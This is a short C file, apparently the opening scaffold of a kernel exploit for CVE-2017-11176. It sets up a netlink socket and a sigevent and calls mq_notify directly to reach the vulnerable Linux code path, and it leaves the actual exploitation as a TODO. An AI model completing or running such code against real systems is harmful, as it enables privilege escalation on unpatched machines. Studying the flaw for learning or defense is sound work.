/*
* CVE-2017-11176 Exploit.
*/
#define _GNU_SOURCE
#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#define NOTIFY_COOKIE_LEN (32)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

int main(void)
{
	struct sigevent sigev;
	char sival_buffer[NOTIFY_COOKIE_LEN];
	int sock_fd;

	printf("-={ CVE-2017-11176 Exploit }=-\n");

	if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) < 0)
	{
 		perror("socket");
 		goto fail;
 	}
 	printf("netlink socket created = %d\n", sock_fd);

	// initialize the sigevent structure
	memset(&sigev, 0, sizeof(sigev));
	sigev.sigev_notify = SIGEV_THREAD;
	sigev.sigev_value.sival_ptr = sival_buffer;
	sigev.sigev_signo = sock_fd;

	printf("sigev = 0x%p\n", &sigev);
	if (_mq_notify((mqd_t)-1, &sigev))
	{
		perror("mqnotify");
		goto fail;
	}
	printf("mqnotify succeed\n");

	// TODO: exploit

	return 0;

	fail:
	printf("exploit failed!\n");
	return -1;
}
